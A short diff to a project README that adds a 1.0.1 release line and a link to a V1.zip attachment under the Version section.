@@ -133,3 +133,5 @@ Personal use only. Not for distribution on app stores.
 ## Version
 
 1.0.0 - Initial release
+1.0.1 Release
+[V1.zip](https://github.com/user-attachments/files/24244521/V1.zip)
